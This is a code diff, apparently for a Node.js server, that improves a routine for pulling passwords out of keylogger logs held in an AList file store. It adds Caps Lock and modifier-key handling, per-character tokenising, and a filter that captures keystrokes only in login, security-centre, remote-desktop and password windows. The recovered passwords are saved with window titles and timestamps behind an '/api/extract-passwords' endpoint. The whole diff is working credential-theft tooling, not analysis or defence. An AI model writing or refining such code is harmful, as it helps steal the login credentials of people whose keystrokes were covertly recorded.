@@ -1517,10 +1517,32 @@ const extractionCache = {
     })
 };
 
-function parsePasswordFromSequence(sequence, initialShift, initialCtrl, initialAlt) {
+// ========== 密码提取核心函数 ==========
+
+// 将一行文本拆分为 tokens：特殊键整体保留，普通字符逐字拆分
+function splitLineIntoTokens(line) {
+    const tokens = [];
+    const regex = /\[[^\]]+\]|./g;
+    let match;
+    while ((match = regex.exec(line)) !== null) {
+        const token = match[0];
+        if (token.startsWith('[') && token.endsWith(']')) {
+            tokens.push(token);
+        } else {
+            for (const ch of token) {
+                tokens.push(ch);
+            }
+        }
+    }
+    return tokens;
+}
+
+// 解析按键序列为最终密码文本
+function parsePasswordFromSequence(sequence, initialShift, initialCtrl, initialAlt, initialCaps) {
     let shift = initialShift;
     let ctrl = initialCtrl;
     let alt = initialAlt;
+    let caps = initialCaps;
     const result = [];
     const shiftMap = {
         '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
@@ -1537,118 +1559,133 @@ function parsePasswordFromSequence(sequence, initialShift, initialCtrl, initialA
         if (item === '[LCONTROL_RELEASE]' || item === '[RCONTROL_RELEASE]') { ctrl = false; continue; }
         if (item === '[LALT]' || item === '[RALT]') { alt = true; continue; }
         if (item === '[LALT_RELEASE]' || item === '[RALT_RELEASE]') { alt = false; continue; }
-        if (item.startsWith('[') && item.endsWith(']')) continue;
-        if (ctrl || alt) continue;
-        
+        if (item === '[CAPSLOCK]') { caps = !caps; continue; }
+        if (item.startsWith('[') && item.endsWith(']')) continue; // 忽略其他功能键
+        if (ctrl || alt) continue; // Ctrl/Alt 组合键不视为密码输入
+
         let char = item;
         if (item.length === 1) {
-            char = shift ? (shiftMap[item] || item.toUpperCase()) : item.toLowerCase();
+            const isLetter = /^[a-zA-Z]$/.test(item);
+            const upper = (caps && isLetter) ? !shift : shift;
+            char = upper ? (shiftMap[item] || item.toUpperCase()) : item.toLowerCase();
         }
         result.push(char);
     }
     return result.join('');
 }
 
+// 主提取函数
 function extractPasswordsFromLog(content, filename) {
     const passwords = [];
     const lines = content.split('\n');
-    
+
     let currentWindow = '';
     let timestamp = null;
-    let inPasswordField = false;
+    let inPasswordMode = false;           // 是否处于密码捕获模式
     let rawSequence = [];
     let shiftPressed = false;
     let ctrlPressed = false;
     let altPressed = false;
+    let capsLock = false;
+
+    // 判断窗口是否为敏感窗口（需要捕获密码）
+    const isSensitiveWindow = (winTitle) => {
+        const lower = winTitle.toLowerCase();
+        return lower.includes('安全中心') ||
+               lower.includes('登录') ||
+               lower.includes('远程桌面连接') ||
+               lower.includes('keylogger') ||
+               lower.includes('alist') ||
+               lower.includes('password') ||
+               lower.includes('密码');
+    };
 
     const saveCurrentPassword = () => {
-        if (inPasswordField && rawSequence.length > 0) {
-            const rawPwd = rawSequence.join('\n');
-            const parsed = parsePasswordFromSequence(rawSequence, shiftPressed, ctrlPressed, altPressed);
-            if (parsed && parsed.length >= 1) {
+        if (inPasswordMode && rawSequence.length > 0) {
+            const parsed = parsePasswordFromSequence(rawSequence, shiftPressed, ctrlPressed, altPressed, capsLock);
+            if (parsed && parsed.length >= 3) {  // 过滤过短的误触
                 passwords.push({
                     file: filename,
                     timestamp: timestamp || '未知',
                     password: parsed,
-                    rawPassword: rawPwd,
+                    rawPassword: rawSequence.join(''),
                     window: currentWindow || '未知窗口'
                 });
             }
             rawSequence = [];
         }
-        shiftPressed = false;
-        ctrlPressed = false;
-        altPressed = false;
+        // 离开敏感窗口后自动关闭捕获模式
+        if (!isSensitiveWindow(currentWindow)) {
+            inPasswordMode = false;
+        }
     };
 
     for (let i = 0; i < lines.length; i++) {
         const line = lines[i].trim();
-        
+        if (!line) continue;
+
+        // 窗口切换行
         if (line.startsWith('[Window:')) {
             saveCurrentPassword();
-            inPasswordField = false;
             rawSequence = [];
             shiftPressed = false;
             ctrlPressed = false;
             altPressed = false;
-            
-            const tsMatch = line.match(/at (\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\+\d{4})/);
+
+            const tsMatch = line.match(/at (\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}[+-]\d{4})/);
             if (tsMatch) timestamp = tsMatch[1];
-            const winMatch = line.match(/\[Window:\s*(.+?)\s*at/);
-            if (winMatch) currentWindow = winMatch[1];
-            continue;
-        }
-        
-        if (line === '[LSHIFT]' || line === '[RSHIFT]') { shiftPressed = true; continue; }
-        if (line === '[LSHIFT_RELEASE]' || line === '[RSHIFT_RELEASE]') { shiftPressed = false; continue; }
-        if (line === '[LCONTROL]' || line === '[RCONTROL]') { ctrlPressed = true; continue; }
-        if (line === '[LCONTROL_RELEASE]' || line === '[RCONTROL_RELEASE]') { ctrlPressed = false; continue; }
-        if (line === '[LALT]' || line === '[RALT]') { altPressed = true; continue; }
-        if (line === '[LALT_RELEASE]' || line === '[RALT_RELEASE]') { altPressed = false; continue; }
+            const winMatch = line.match(/\[Window:\s*(.+?)\s*-?\s*at/);
+            if (winMatch) currentWindow = winMatch[1].trim();
 
-        if (line.startsWith('[Focus:')) {
-            const focusLower = line.toLowerCase();
-            if (focusLower.includes('password') || focusLower.includes('密码')) {
-                saveCurrentPassword();
-                inPasswordField = true;
-                rawSequence = [];
+            // 进入敏感窗口时开启密码捕获模式
+            if (isSensitiveWindow(currentWindow)) {
+                inPasswordMode = true;
             } else {
-                saveCurrentPassword();
-                inPasswordField = false;
+                inPasswordMode = false;
             }
             continue;
         }
 
-        if (line.includes('[TAB]')) {
-            if (inPasswordField) {
+        // 如果当前不在密码捕获模式，跳过本行
+        if (!inPasswordMode) continue;
+
+        // 将当前行拆分为 tokens 并逐个处理
+        const tokens = splitLineIntoTokens(line);
+        for (const token of tokens) {
+            // 更新修饰键状态（全局追踪）
+            if (token === '[LSHIFT]' || token === '[RSHIFT]') { shiftPressed = true; continue; }
+            if (token === '[LSHIFT_RELEASE]' || token === '[RSHIFT_RELEASE]') { shiftPressed = false; continue; }
+            if (token === '[LCONTROL]' || token === '[RCONTROL]') { ctrlPressed = true; continue; }
+            if (token === '[LCONTROL_RELEASE]' || token === '[RCONTROL_RELEASE]') { ctrlPressed = false; continue; }
+            if (token === '[LALT]' || token === '[RALT]') { altPressed = true; continue; }
+            if (token === '[LALT_RELEASE]' || token === '[RALT_RELEASE]') { altPressed = false; continue; }
+            if (token === '[CAPSLOCK]') { capsLock = !capsLock; continue; }
+
+            // Tab / Enter 提交密码
+            if (token === '[TAB]' || token === '[ENTER]' || token === '[RETURN]') {
                 saveCurrentPassword();
-                inPasswordField = false;
-            } else {
-                inPasswordField = true;
                 rawSequence = [];
+                continue;
             }
-            continue;
-        }
 
-        if (line.includes('[ENTER]') || line.includes('[RETURN]')) {
-            saveCurrentPassword();
-            inPasswordField = false;
-            continue;
-        }
+            // 退格删除
+            if (token === '[BACKSPACE]' || token === '[BACK]') {
+                rawSequence.pop();
+                continue;
+            }
 
-        if (line === '[BACKSPACE]' || line === '[BACK]') {
-            if (inPasswordField) rawSequence.pop();
-            continue;
-        }
-
-        if (inPasswordField && line && !line.startsWith('[')) {
-            rawSequence.push(line);
+            // 普通字符输入（排除未识别的特殊键）
+            if (!token.startsWith('[') || !token.endsWith(']')) {
+                rawSequence.push(token);
+            }
         }
     }
-    
+
+    // 处理文件末尾未保存的序列
     saveCurrentPassword();
     return passwords;
 }
+
 
 app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
     const allFiles = await alistClient.listFiles(alistClient.basePath);
